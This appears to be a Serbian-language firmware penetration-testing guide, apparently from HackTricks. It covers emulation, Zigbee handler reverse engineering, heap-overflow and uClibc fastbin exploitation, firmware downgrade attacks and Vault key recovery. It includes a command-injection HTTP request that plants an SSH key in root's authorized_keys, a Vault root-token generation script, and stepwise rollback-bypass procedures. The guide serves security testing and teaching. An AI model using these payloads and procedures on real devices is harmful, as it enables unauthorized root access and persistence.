Pregledajte trajno stanje izvan guest sistema kada sporo pokretanje, destruktivne startup skripte ili nepouzdano beleženje konzole otežavaju utvrđivanje uzroka greške. Nikada ne priključujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte grupu volumena pre prekidanja veze.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivu izolaciju grešaka, upisujte datoteke sa vremenskim oznakama na stabilan, upisiv volumen i proveravajte ih van mreže; `/dev/kmsg`, FIFO-ovi i privremene konzole mogu dati lažno negativne rezultate zbog ograničavanja frekvencije ili preranog gašenja procesa. Takođe uporedite tačne interfejse na različitim slojevima pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, ext4 funkcije na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram DRI driver ABI-ja i naziva drivera izvedenih iz PCI podataka. Komponenta može postojati, pa čak i uspešno proći kroz `dlopen()`, a ipak biti neupotrebljiva jer njen korisnik očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Neophodno je održavati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će možda povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba da obuhvati ponovni pregled sistema datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa i istraživanje ranjivosti bootloadera. Testovi integriteta firmware-a ključni su za prepoznavanje potencijalnih ranjivosti koje omogućavaju backdoor pristup.

## Tehnike analize u toku izvršavanja

Analiza u toku izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, korišćenjem alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i otkrivanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljne uređaje bez potpunog debuggера, **kopirajte statički linkovan `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee poruka / radio-koprocesora

U IoT čvorištima, RF stek je često podeljen između **radio MCU-a** i procesa u Linux userland-u. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF okvir** u vazduhu
2. **Parser na strani kontrolera** na radio MCU-u
3. **Tekstualni ili TLV protokol preko serijske veze/UART-a** prosleđen Linux-u (na primer `/dev/tty*`)
4. **Dispečer aplikacije** u glavnom daemon-u
5. **Rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura daje dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio-okvire u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele za dispečiranje
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji rukovaoci su dostupni samo tokom faza **commissioning-a**, otkrivanja ili preuzimanja firmware-a/modela

Konkretno za Zigbee, snimite saobraćaj tokom uparivanja i proverite da li se uređaj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje saobraćaja tokom commissioning-a može otkriti **Network Key**. Install codes u Zigbee 3.0 umanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista zahteva.

### Rukovaoci protokola specifični za proizvođača i dostupnost ograničena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera jer prosleđuju podatke **prilagođenom kodu za parsiranje** i internim **FSM-ovima** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktični postupak:

- Obrnite dispečer komandi dok ne pronađete **rukovalac dostupan samo proizvođaču**.
- Rekonstruišite tabele **stanja FSM-a**, **događaja**, **provera**, **akcija** i **sledećih stanja**.
- Utvrdite **prelazna stanja** koja automatski napreduju, kao i grane za ponovni pokušaj/b grešku koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje su legitimne razmene protokola potrebne da bi se daemon doveo u ranjivo stanje, umesto da pretpostavljate da je ranjivi rukovalac uvek dostupan.

Kod vremenski osetljivih protokola, ponovno slanje paketa iz Python okruženja može biti presporo. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz stek proizvođačkog nivoa, kako bi se obezbedili odgovarajući **endpoint-i**, **atributi** i vreme za commissioning.

### Klasa grešaka pri fragmentiranom preuzimanju u ugrađenim daemon-ima

Ponavljajuća klasa grešaka u firmware-u javlja se pri **fragmentiranom preuzimanju blob-a/modela/konfiguracije**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo lokalna **polja paketa** pod kontrolom napadača, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **prvobitnu veličinu alokacije**.

Napadač može da pošalje:

- Prvi ispravan fragment sa **malom** deklarisanom ukupnom veličinom, čime se forsira mala heap alokacija.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu lokalnu veličinu paketa koja zadovoljava nove provere, a ipak izaziva prekoračenje prvobitno alociranog bafera.

Kada se ranjiva putanja nalazi iza logike za commissioning, eksploatacija mora da obuhvati dovoljno **emulacije uređaja** da bi se cilj doveo u očekivano stanje preuzimanja modela ili blob-a pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U ugrađenim daemon-ima, najlakši način za pokretanje eksploatacije heap metapodataka često nije „čekanje na čišćenje“, već **forsiranje sopstvene obrade grešaka przez protokol**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM doveli u stanja **ponovnog pokušaja** ili **greške**.
- Pređite prag za ponovne pokušaje kako bi daemon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidljiv `free()` za pokretanje primitiva na strani alokatora pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-sličnih** alokatora u ugrađenom Linux-u, gde oštećivanje metapodataka chunk-a može da pretvori unlink/unbin logiku u primitivu za upis. Stabilan obrazac je oštećivanje **polja veličine** kako bi se kretanje alokatora preusmerilo na **lažne chunk-ove postavljene unutar prekoračenog bafera**, umesto da se odmah prepišu pokazivači stvarnih bin-ova i sruši proces.

## Binarna eksploatacija i Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva dobro poznavanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Zaštite binarnog runtime-a su retke u ugrađenim sistemima, ali kada postoje, mogu biti potrebne tehnike poput Return Oriented Programming (ROP).

### Napomene o eksploataciji uClibc fastbin-a (ugrađeni Linux)

- **Fastbin-ovi + konsolidacija:** uClibc koristi fastbin-ove slične onima u glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki lažni chunk mora da prođe provere (ispravna veličina, `fd = 0` i okolni chunk-ovi koji se smatraju „zauzetim“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese unutar `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na ispravno zaglavlje heap chunk-a kako biste fastbin alokaciju usmerili na **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može da zaustavi parsiranje, a da pritom zadrži završne bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da postavi izvršni shellcode u poznato mapiranje i prebaci izvršavanje na njega.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) nude unapred konfigurisana okruženja za bezbednosno testiranje firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i pentestingu IoT (Internet of Things) uređaja. Štedi mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za bezbednosno testiranje ugrađenih uređaja, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmware-a.

## Napadi vraćanjem firmware-a na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa za slike firmware-a, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Kada boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se flešuje, napadač može legitimno da instalira **stariji, ranjivi firmware sa važećim potpisom** i tako ponovo uvede zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Tipičan tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili sajta podrške proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite je u repozitorijumima trećih strana kao što su VirusTotal, Internet archives, forumi itd.
2. **Otpremite sliku na uređaj ili je učinite dostupnom uređaju** preko bilo kog izloženog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi IoT uređaji za potrošače izlažu HTTP(S) endpoint-e *bez autentifikacije* koji prihvataju Base64-kodirane blob-ove firmware-a, dekodiraju ih na strani servera i pokreću recovery/nadogradnju.
3. Posle vraćanja na stariju verziju, iskoristite ranjivost koja je ispravljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji ponovo flešujte najnoviju sliku ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja postojanosti.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom firmware-u (sa snižene verzije), parametar `md5` se direktno nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje pristupa root nalogu pomoću SSH ključa). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali pošto ne postoji zaštita od vraćanja na stariju verziju, ispravka je beskorisna.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači pakuju kompletne firmware slike u svoje prateće mobilne aplikacije, tako da aplikacija može da ažurira uređaj preko Bluetooth/Wi-Fi veze. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updater-u kod A/B slot dizajna

Neki vendori implementiraju **ratchet** za sprečavanje downgrade-a, ali samo unutar logike *updater-a* (na primer, UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje tabeli particija ili metapodacima slota, rollback zaštita i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmware-a sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater poredi ratchet image-a sa vrednošću sačuvanom u trajnom skladištu i odbacuje starije potpisane image-e.
- **Bootloader** ne parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se zasebno, u tabeli particija ili brojaču generacije po slotu, i **nije kriptografski vezana** za tačan digest firmware-a koji je validiran.

To omogućava primitivu **validate-one-image / boot-another-image** u dual-slot sistemima. Ako napadač može da natera updater da označi slot B kao sledeću metu za pokretanje pomoću aktuelnog potpisanog image-a, a zatим da pre ponovnog pokretanja prebriše slot B, bootloader i dalje može da pokrene downgrade-ovan image, jer veruje samo već potvrđenim metapodacima slota.

Uobičajen obrazac zloupotrebe:

1. Otpremite **aktuelni potpisani** firmware u pasivni slot i pokrenite uobičajenu rutinu za validaciju/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni.
2. **Još nemojte ponovo pokretati uređaj**. U istoj sesiji ponovo pokrenite rutinu za pripremu/brisanje slota.
3. Iskoristite zastarelo stanje pokretanja ili zastarelu logiku izbora slota, tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upisati u taj slot **stariji, ali i dalje potpisani** firmware.
5. Preskočite rutinu validacije koja sprovodi ratchet i direktno ponovo pokrenite uređaj.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće stari image.

Na šta obratiti pažnju pri reverse engineering-u A/B implementacija ažuriranja:

- Izbor slota zasnovan na **zastavicama pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja, umesto na osnovu **trenutnog potvrđenog rasporeda**.
- Funkcija u stilu `part_write_layout()` koja samo uvećava **brojač generacije** / aktivnu zastavicu i ne čuva hash validiranog image-a.
- Provere ratchet-а implementirane u userspace-u ili kodu updater-a, ali **ne** u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili recovery koje ostavljaju slot označenim kao pokretljivim čak i nakon uklanjanja i ponovnog upisa njegovog sadržaja.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transportna veza/autentifikacija *krajnje tačke za ažuriranje* adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj proverava **brojeve verzija** ili **monotoni anti-rollback brojač** pre flešovanja?
* Da li se image proverava unutar lanca secure boot-a (npr. ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju validiranog firmware-a** ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slota, da li je uređaj primoran da se ponovo pokrene ili su kasnije rutine ažuriranja/brisanja i dalje dostupne u istoj sesiji?
* Da li kod userland-a obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* ili *rezervni* tokovi ažuriranja ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmware za vežbu

Da biste vežbali otkrivanje ranjivosti u firmware-u, kao početnu tačku koristite sledeće projekte ranjivog firmware-a.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekat Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Vraćanje ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault stanja

Kada image ažuriranja kombinuje male metapodatke u otvorenom tekstu sa velikim blob-om visoke entropije, prvo analizirajte kontejner, pre nego što pokušate bilo šta da razbijete brute-force metodom:<sup>[[1]](#references)</sup>

- Izdvojite zaglavlja, pomeraje i granice redova pomoću alata `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova čine salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je nagoveštaj da je reč o RSA-2048 ciphertext-u koji sadrži nasumičnu lozinku ključа/sesije za firmware.
- Odvojeni PGP materijal u istoj datoteci često služi samo za proveru autentičnosti; nemojte pretpostavljati da se koristi za poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, obrnuto analizirajte **operativni put dešifrovanja** umesto da tražite samo privatne ključeve:

- Dekompajlirajte updater / binarnu datoteku za upravljanje i pratite ko čita šifrovani blob, koja pomoćna funkcija/API ga dešifruje i koji logički naziv ključa zahteva.
- Pretražite izdvojeni root filesystem u potrazi za stanjem KMS-a (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datotekama i init skriptama.
- Tretirajte komande `vault operator unseal ...` u otvorenom tekstu, recovery ključeve, bootstrap tokene ili lokalne KMS skripte za automatsko otpečaćivanje kao ekvivalent materijalu privatnog ključa.

Ako uređaj sadrži originalnu Vault binarnu datoteku i backend za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne funkcije Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ koristeći tačan par padding/hash koji koristi KMS. Neuspešna dekripcija PKCS#1 v1.5 i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok su uobičajene biblioteke podrazumevano podešene na SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte OpenSSL KDF dobavljača (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Tako „šifrovani firmware” postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, a zatim van mreže reprodukujte tačne parametre unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a pomoću Claude-a: veština seniora, autonomija juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT hacking: Definitivni vodič za napadanje Interneta stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day propusta u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada me vidiš: sada si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - Deo 2: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: iskorišćavanje Philips Hue Bridge-a putem bežičnog ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, deo 1: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, deo 2: otklanjanje grešaka i ispravljanje](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [BIOS lozinke za Dell: slaba XOR enkripcija omogućava oporavak iz SPI flash-a (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - alati za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — osvežavanje znanja o hardware hacking-u, deo 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
